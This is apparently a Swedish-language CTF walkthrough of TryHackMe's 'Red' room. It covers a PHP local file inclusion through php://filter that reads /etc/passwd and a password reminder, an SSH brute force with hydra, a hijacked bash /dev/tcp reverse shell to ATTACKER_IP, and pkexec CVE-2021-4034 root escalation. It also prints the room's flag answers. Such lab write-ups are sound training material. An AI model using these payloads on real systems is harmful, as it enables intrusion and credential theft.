---
title: "Red Writeup"
date: 2023-07-17
tags: [writeup, ctf, tryhackme]
description: "Utnyttjar en exponerad tjänst för att få fotfäste och använder CVE-2021-4034 pkexec-buggen för att roota TryHackMes Red-rum."
---

## Setup 

Vi måste först ansluta till tryhackmes VPN-server. Du kan få mer information om detta genom att besöka [Access](https://tryhackme.com/access)-sidan.

Jag kommer att använda openvpn för att ansluta till servern. Här är kommandot:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Rekognosering

Nu när allt är uppsatt och klart, låt oss göra lite grundläggande recon:
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535  -- -sC -oN rustscan_port_scan.txt
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p 22,80  -- -sV -oN rustscan_service_scan.txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Schysst, så vi har 2 tjänster igång, en http-server och en ssh-server. Låt oss se vad http-servern har att erbjuda:
![](/assets/img/writeup_assets/red/port-80.png)

Notera att URL:en är: `http://TARGET_IP/index.php?page=home.html`. Det ser ut som en potentiell vektor för LFI. Låt oss kolla om så är fallet. Vi kan testa att inkludera filen `index.php` och se vad som händer:
```shell-session
$ curl "http://TARGET_IP/index.php?page=./index.php"

<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

```

Bingo! Vi kan se att filen `index.php` tar emot `page` och läser filen som anges där. Det finns sanering, men det kan vi ta oss runt. Låt oss se om vi direkt kan inkludera `/etc/issue` med hjälp av filter-wrappern `php://`:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/issue

Ubuntu 20.04.4 LTS \n \l
```

Snyggt! Hur ser det ut med `/etc/passwd`?
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/passwd

...
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

OK, så vi har 2 användare som vi potentiellt kan få åtkomst som: `red` och `blue`. Låt oss kolla filerna i deras hemkataloger:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bashrc
<NORMAL STUFF>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/red/.bashrc
<NOPE, NOTHING INTERESTING>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

OOOOO Intressant. Det verkar som att någon har genererat en lösenordslista med hashcat... och tagit bort den? Det finns inga spår av att denna `.reminder` har tagits bort, värt ett försök:
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.reminder
sup3r_p@s$w0rd!
```

Snyggt! Låt oss nu generera `passlist.txt`:
```shell-session
$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
$ wc passlist.txt                                  
  77   77 1114 passlist.txt
```

Eftersom en av ledtrådarna säger: 
> 2. Red likes to change adversaries' passwords but tends to keep them relatively the same. 

Antar jag att passlistan innehåller alla möjliga lösenord för `blue`. Låt oss försöka bruteforca oss in.

## Få åtkomst

```shell-session
$ hydra -l blue -P passlist.txt -v TARGET_IP ssh  
...
[22][ssh] host: TARGET_IP   login: blue   password: [PASSWORD FROM passlist.txt]
...
```

Låt oss nu logga in på maskinen med dessa uppgifter:
```shell-session
$ ssh blue@TARGET_IP
...
blue@red:~$ ls -la
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Jul 17 13:30 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

> What is the first flag?
> 
> Answer: `THM{Is_thAt_all_y0u_can_d0_blU3?}`

Efter lite analys med `linpeas` och `pspy` (eller alternativt kan du bara använda `ps -aux`) märker vi 2 saker:

1. Filen `/etc/hosts` har en post och vi kan bara _lägga till_ i den:

```plaintext
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

2. Det finns en process som körs kontinuerligt:

```shell
bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

_Men_ IP-adressen 192.168.0.1 leder faktiskt ingenstans. Så vi kan bara lägga till en post för `redrules.thm` i `/etc/hosts` som leder till vår maskin och starta en listener för att få ett reverse shell som red:
```shell-session
## On target:
$ echo "ATTACKER_IP redrules.thm" >> /etc/hosts

## On our machine:
$ nc -nvlp 9001

red@red$ ls
flag2

red@red$ cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
```

> What is the second flag?
> 
> Answer: `THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`

## Behörighetseskalering

Enumrerar grejer:
```shell-session
$ find / -perm /u=s,g=s 2>/dev/null
...
...
/home/red/.git/psexec
```

Okej... Så. Det finns en `psexec` i reds hemkatalog. Låt oss se vilken version det är:
```shell-session
red@red$ /home/red/.git/psexec --version
psexec version 0.105
```

En snabb sökning på nätet visar att den här versionen är sårbar och kan användas för privesc: (CVE-2021-4034)
Jag kommer att använda en PoC-exploit skriven i python: https://github.com/Almorabea/pkexec-exploit
Skriptet kommer att modifieras en aning: 
```diff
- libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
+ libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

_Få över detta till målet och kör det för att få ett root-shell :)_
När vi väl har ett root-shell kan vi hämta root-flaggan:
```shell-session
red@red$ python3 exploit.py
whoami
root

ls /root
...
flag3
...

cat /root/flag3
THM{Go0d_Gam3_Blu3_GG}
```

> What is the third flag?
> 
> Answer: `THM{Go0d_Gam3_Blu3_GG}`


## Sammanfattning

Den här tog mig ärligt talat längre tid än jag vågar erkänna på grund av den där sjukt frustrerande kickout-mekanismen. Dessutom överkomplicerade jag saker, så det blev rena rabbithole-ception. Hur som helst... jag hoppas att den här writeupen var till hjälp. Om du gillade den, överväg gärna att följa mig på [github](https://github.com/NovusEdge) och lämna en stjärna på [repot](https://github.com/NovusEdge/thm-writeups)


- Rum: [Red](https://tryhackme.com/room/redisl33t)
